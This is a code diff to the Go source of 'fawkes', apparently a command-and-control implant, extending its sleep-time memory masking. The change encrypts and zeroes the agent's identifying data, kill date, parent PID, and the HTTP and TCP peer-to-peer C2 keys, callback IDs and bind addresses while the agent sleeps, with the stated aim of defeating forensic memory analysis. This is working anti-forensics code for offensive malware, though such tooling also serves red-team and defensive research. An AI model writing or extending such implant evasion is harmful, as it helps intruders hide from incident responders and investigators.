@@ -13,15 +13,28 @@ import (
 	"fawkes/pkg/structs"
 )
 
-// sleepVault holds encrypted copies of sensitive agent and C2 profile data
-// during sleep cycles. While the agent sleeps, original struct fields are
+// sleepVault holds encrypted copies of sensitive agent, C2 profile, and TCP P2P
+// data during sleep cycles. While the agent sleeps, original struct fields are
 // zeroed and data lives only in the encrypted vault — making memory dumps
 // during sleep far less useful for forensic analysis.
+//
+// State that CANNOT be encrypted during sleep (documented for completeness):
+//   - SOCKS manager: live net.Conn handles cannot be serialized/encrypted
+//   - RPFWD manager: live net.Listener and net.Conn handles
+//   - File transfer channels: Go channels have no serialization API
+//   - HTTP client: internal transport/TLS state not accessible
+//   - TCP P2P parent/child connections: live net.Conn handles
+//
+// These are acceptable because: (1) connection handles alone don't reveal C2
+// infrastructure, and (2) the sleep mask only activates when no tasks are
+// running, meaning most of these resources are idle or empty.
 type sleepVault struct {
 	key           []byte // Random AES-256-GCM key for this sleep cycle
 	agentBlob     []byte // Encrypted agent sensitive fields
-	profileBlob   []byte // Encrypted C2 profile sensitive fields (nil if tasks active)
+	profileBlob   []byte // Encrypted C2 profile sensitive fields
 	profileMasked bool   // Whether C2 profile fields were encrypted
+	tcpBlob       []byte // Encrypted TCP P2P profile sensitive fields
+	tcpMasked     bool   // Whether TCP P2P profile fields were encrypted
 }
 
 // agentSensitiveData holds the Agent struct fields that could identify the
@@ -35,6 +48,11 @@ type agentSensitiveData struct {
 	ExternalIP  string `json:"e"`
 	ProcessName string `json:"p"`
 	Description string `json:"s"`
+	// Operational fields — reveal agent scheduling and targeting
+	Architecture string `json:"a,omitempty"`
+	OS           string `json:"o,omitempty"`
+	KillDate     int64  `json:"k,omitempty"`
+	DefaultPPID  int    `json:"pp,omitempty"`
 }
 
 // profileSensitiveData holds the HTTP C2 profile fields that reveal the
@@ -50,9 +68,18 @@ type profileSensitiveData struct {
 	CustomHeaders map[string]string `json:"x,omitempty"`
 }
 
-// obfuscateSleep encrypts sensitive agent and C2 profile data before the
-// agent enters a sleep cycle. The original struct fields are zeroed so a
-// process memory dump during sleep only reveals the encrypted vault.
+// tcpSensitiveData holds the TCP P2P profile fields that reveal encryption
+// keys, callback identity, and bind addresses. These are often duplicates
+// of HTTP profile values — both must be zeroed to prevent forensic recovery.
+type tcpSensitiveData struct {
+	EncryptionKey string `json:"k"`
+	CallbackUUID  string `json:"c"`
+	BindAddress   string `json:"b,omitempty"`
+}
+
+// obfuscateSleep encrypts sensitive agent, C2 profile, and TCP P2P data
+// before the agent enters a sleep cycle. The original struct fields are
+// zeroed so a process memory dump during sleep only reveals the encrypted vault.
 //
 // Masking is skipped entirely when tasks are running. Running task goroutines
 // hold pointers to the agent and C2 profile structs — zeroing fields while
@@ -79,16 +106,20 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 		return nil
 	}
 
-	// Encrypt agent sensitive fields
+	// --- Encrypt agent sensitive fields ---
 	ad := agentSensitiveData{
-		PayloadUUID: agent.PayloadUUID,
-		Domain:      agent.Domain,
-		Host:        agent.Host,
-		User:        agent.User,
-		InternalIP:  agent.InternalIP,
-		ExternalIP:  agent.ExternalIP,
-		ProcessName: agent.ProcessName,
-		Description: agent.Description,
+		PayloadUUID:  agent.PayloadUUID,
+		Domain:       agent.Domain,
+		Host:         agent.Host,
+		User:         agent.User,
+		InternalIP:   agent.InternalIP,
+		ExternalIP:   agent.ExternalIP,
+		ProcessName:  agent.ProcessName,
+		Description:  agent.Description,
+		Architecture: agent.Architecture,
+		OS:           agent.OS,
+		KillDate:     agent.KillDate,
+		DefaultPPID:  agent.DefaultPPID,
 	}
 	plaintext, err := json.Marshal(ad)
 	if err != nil {
@@ -112,9 +143,15 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 	agent.ExternalIP = ""
 	agent.ProcessName = ""
 	agent.Description = ""
+	agent.Architecture = ""
+	agent.OS = ""
+	agent.KillDate = 0
+	agent.DefaultPPID = 0
 
-	// Encrypt C2 profile — safe because we already confirmed no tasks running.
-	if hp, ok := c2.(*fhttp.HTTPProfile); ok {
+	// --- Encrypt HTTP C2 profile ---
+	// Skip if the config vault is active — fields are already encrypted at rest
+	// and only decrypted on-demand for individual HTTP operations.
+	if hp, ok := c2.(*fhttp.HTTPProfile); ok && !hp.IsSealed() {
 		pd := profileSensitiveData{
 			EncryptionKey: hp.EncryptionKey,
 			BaseURL:       hp.BaseURL,
@@ -139,6 +176,29 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 				hp.PostEndpoint = ""
 				hp.CustomHeaders = nil
 				vault.profileMasked = true
+			}
+		}
+	}
+
+	// --- Encrypt TCP P2P profile ---
+	// The TCP profile holds a copy of EncryptionKey and CallbackUUID — if we
+	// only zero the HTTP profile copy, a forensic examiner can still recover
+	// these values from the TCP profile's fields.
+	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil {
+		td := tcpSensitiveData{
+			EncryptionKey: tcpP2P.EncryptionKey,
+			CallbackUUID:  tcpP2P.CallbackUUID,
+			BindAddress:   tcpP2P.BindAddress,
+		}
+		tPlain, tErr := json.Marshal(td)
+		if tErr == nil {
+			vault.tcpBlob = sleepEncrypt(vault.key, tPlain)
+			zeroBytes(tPlain)
+			if vault.tcpBlob != nil {
+				tcpP2P.EncryptionKey = ""
+				tcpP2P.CallbackUUID = ""
+				tcpP2P.BindAddress = ""
+				vault.tcpMasked = true
 			}
 		}
 	}
@@ -169,6 +229,10 @@ func deobfuscateSleep(vault *sleepVault, agent *structs.Agent, c2 profiles.Profi
 				agent.ExternalIP = ad.ExternalIP
 				agent.ProcessName = ad.ProcessName
 				agent.Description = ad.Description
+				agent.Architecture = ad.Architecture
+				agent.OS = ad.OS
+				agent.KillDate = ad.KillDate
+				agent.DefaultPPID = ad.DefaultPPID
 			}
 			zeroBytes(plaintext)
 		}
@@ -176,7 +240,7 @@ func deobfuscateSleep(vault *sleepVault, agent *structs.Agent, c2 profiles.Profi
 		vault.agentBlob = nil
 	}
 
-	// Restore profile fields
+	// Restore HTTP profile fields
 	if vault.profileMasked && vault.profileBlob != nil {
 		if hp, ok := c2.(*fhttp.HTTPProfile); ok {
 			plaintext := sleepDecrypt(vault.key, vault.profileBlob)
@@ -197,6 +261,24 @@ func deobfuscateSleep(vault *sleepVault, agent *structs.Agent, c2 profiles.Profi
 		}
 		zeroBytes(vault.profileBlob)
 		vault.profileBlob = nil
+	}
+
+	// Restore TCP P2P profile fields
+	if vault.tcpMasked && vault.tcpBlob != nil {
+		if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil {
+			plaintext := sleepDecrypt(vault.key, vault.tcpBlob)
+			if plaintext != nil {
+				var td tcpSensitiveData
+				if err := json.Unmarshal(plaintext, &td); err == nil {
+					tcpP2P.EncryptionKey = td.EncryptionKey
+					tcpP2P.CallbackUUID = td.CallbackUUID
+					tcpP2P.BindAddress = td.BindAddress
+				}
+				zeroBytes(plaintext)
+			}
+		}
+		zeroBytes(vault.tcpBlob)
+		vault.tcpBlob = nil
 	}
 
 	// Zero the vault key
